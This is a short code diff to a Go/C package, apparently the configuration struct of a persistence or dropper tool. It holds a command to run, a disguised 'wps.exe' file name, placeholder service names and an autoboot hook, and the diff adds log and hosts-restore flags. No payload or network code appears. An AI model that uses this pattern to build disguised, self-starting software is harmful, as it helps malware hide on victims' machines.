@@ -14,7 +14,7 @@ package cpack
 #include <dirent.h>
 #include "xxs.h"
 #include <limits.h>
-struct FALLEN_DATA
+ struct FALLEN_DATA
 {
 	unsigned int finder;
 	char xxs[1000];			//运行命令
@@ -27,6 +27,8 @@ struct FALLEN_DATA
 	char SerName[100];		//服务名称
 	char Serdisplay[128];	//显示名称
 	char Serdesc[256];		//服务描述
+	bool log;				//输出log
+	bool hosts;				//还原hosts
 }
 fallen_data =
 {
@@ -40,7 +42,9 @@ fallen_data =
 	"wps.exe",
 	"fuwmc",
 	"xiansmc",
-	"fuwumiaosu"
+	"fuwumiaosu",
+	false,
+	false,
 };
 
 
@@ -82,6 +86,8 @@ import "C"
 var Xxs = C.GoString(C.xxs)
 var Filename = C.GoString(C.filename)
 var LinuxProcess = C.GoString(C.linuxProcess)
+var Log = C.fallen_data.log
+var Hosts = C.fallen_data.hosts
 func Autoboot (a string) {
 	C.autoboot(C.CString(a))
 }
